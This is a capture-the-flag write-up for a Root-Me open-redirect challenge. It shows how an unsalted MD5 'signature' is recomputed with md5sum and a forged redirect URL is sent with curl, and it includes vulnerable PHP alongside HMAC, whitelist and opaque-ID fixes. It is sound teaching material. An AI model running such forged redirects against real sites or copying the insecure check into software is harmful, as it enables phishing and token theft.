# HTTP - Open Redirect

`Web-Serveur` • `Easy` • `10 pts`

## TL;DR

Bypass redirect validation by forging an MD5 hash of a custom URL to redirect to a domain outside the whitelist.

**Flag:** `REDACTED`

---

## Challenge Description

> Find a way to make a redirect to a domain other than those offered on the web page.

**URL:** `http://challenge01.root-me.org/web-serveur/ch52/`

**Context:** The page offers redirect buttons to whitelisted social networks (Facebook, Twitter, Slack). The goal is to redirect to any other domain.

---

## Recon

**Source code analysis (view-source):**
```html
<a href='?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134'>facebook</a>
<a href='?url=https://twitter.com&h=be8b09f7f1f66235a9c91986952483f0'>twitter</a>
<a href='?url=https://slack.com&h=e52dc719664ead63be3d5066c135b6da'>slack</a>
```

**Observations:**
- Two URL parameters control the redirect: `url` and `h`
- `h` is a 32-character hexadecimal string → looks like **MD5**
- The server validates `h` before allowing the redirect

**Hypothesis:** The server computes `md5(url)` and compares it with the `h` parameter.

---

## Exploitation

### Step 1 — Verify the hypothesis

Compute the MD5 of `https://facebook.com` and compare with the `h` value in the source:

```bash
$ echo -n "https://facebook.com" | md5sum
a023cfbf5f1c39bdf8407f28b60cd134  -
```

✅ **Match confirmed.** The server simply computes `md5(url)` with no secret salt.

---

### Step 2 — Forge a hash for a custom URL

Since there is no HMAC secret, we can compute the valid hash for any URL ourselves:

```bash
$ echo -n "https://google.com" | md5sum
99999ebcfdb78df077ad2727fd00969f  -
```

---

### Step 3 — Send the crafted request

Build the URL with our forged parameters:

```
http://challenge01.root-me.org/web-serveur/ch52/?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f
```

Using `curl -v` to capture the raw response before the redirect is followed:

```bash
$ curl -v "http://challenge01.root-me.org/web-serveur/ch52/?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f"
```

**Response:**
```html
<p>Well done, the flag is [REDACTED]</p>
<script>document.location = 'https://google.com';</script>
```

> 💡 The flag appears in the HTML body **before** the JavaScript redirect executes. A browser follows the redirect instantly and hides it — use `curl` to see the raw response.

---

## Impact & Mitigation

### Real-World Implications

| Vulnerability | Impact |
|---------------|--------|
| **CWE-601** | URL Redirection to Untrusted Site (Open Redirect) |
| **OWASP A01:2021** | Broken Access Control |

**Attack Scenarios:**
1. **Phishing**: Send a link that appears to come from a trusted domain but redirects to a malicious site
2. **OAuth token theft**: Abuse redirect_uri in OAuth flows to exfiltrate tokens
3. **Bypassing URL filters**: Use a trusted domain as a relay to reach a blocked destination
4. **Reputation abuse**: Use a company's own domain to redirect users to malware

**Why this is critical:**
- The `h` parameter gives a false sense of security — without a secret key, anyone can forge it
- Users trust the domain they click on; they won't notice the redirect
- Easily exploitable with basic command-line tools

---

### Secure Implementation

**❌ NEVER do this (vulnerable code):**

```php
// PHP - INSECURE: md5 with no secret
$h = md5($_GET['url']);
if ($h === $_GET['h']) {
    header("Location: " . $_GET['url']); // Attacker controls url AND h
}
```

**✅ DO this instead:**

**Option 1 — Use a server-side secret (HMAC):**
```php
// PHP - SECURE: HMAC with secret key
$secret = getenv('REDIRECT_SECRET');
$expected = hash_hmac('sha256', $_GET['url'], $secret);
if (hash_equals($expected, $_GET['h'])) {
    header("Location: " . $_GET['url']);
}
```

**Option 2 — Whitelist allowed destinations:**
```php
// PHP - SECURE: strict whitelist
$allowed = ['https://facebook.com', 'https://twitter.com', 'https://slack.com'];
if (in_array($_GET['url'], $allowed, true)) {
    header("Location: " . $_GET['url']);
}
```

**Option 3 — Use an opaque redirect ID:**
```php
// PHP - SECURE: never expose the URL directly
$redirects = ['1' => 'https://facebook.com', '2' => 'https://twitter.com'];
if (isset($redirects[$_GET['id']])) {
    header("Location: " . $redirects[$_GET['id']]);
}
```

**Best Practices:**
1. **Never put the destination URL in a client-controlled parameter** without a server-side secret
2. **Use HMAC** (e.g., `hash_hmac`) instead of plain MD5 — without a secret, hashing provides zero protection
3. **Prefer whitelists or opaque IDs** over signed URLs when the list of destinations is known in advance
4. **Validate the final URL** against an allowlist even when using HMAC, as an extra layer
5. **Log redirect attempts** to detect abuse

---

## Key Takeaways

**Technical Skills:**
- Identified a hash-based validation mechanism from HTML source code
- Recognized the MD5 signature by its 32-character hex format
- Verified the hash construction by reproducing it locally
- Forged a valid `(url, h)` pair for an arbitrary domain
- Used `curl -v` to capture the flag from the raw HTTP response before the redirect

**Security Concepts:**
- A hash without a secret key offers **no security** — anyone can recompute it
- **HMAC** (Hash-based Message Authentication Code) is the correct primitive for integrity checks involving untrusted input
- Open redirects are a **phishing enabler**: the attack surface is the user's trust in the domain name
- Browser DevTools can hide important data (flags in HTML bodies that redirect immediately) — always check with `curl`

---

## References

- [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)
- [OWASP: Unvalidated Redirects and Forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [Understanding and Discovering Open Redirect Vulnerabilities - Trustwave](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/understanding-and-discovering-open-redirect-vulnerabilities/)
- [RFC 2104: HMAC](https://datatracker.ietf.org/doc/html/rfc2104)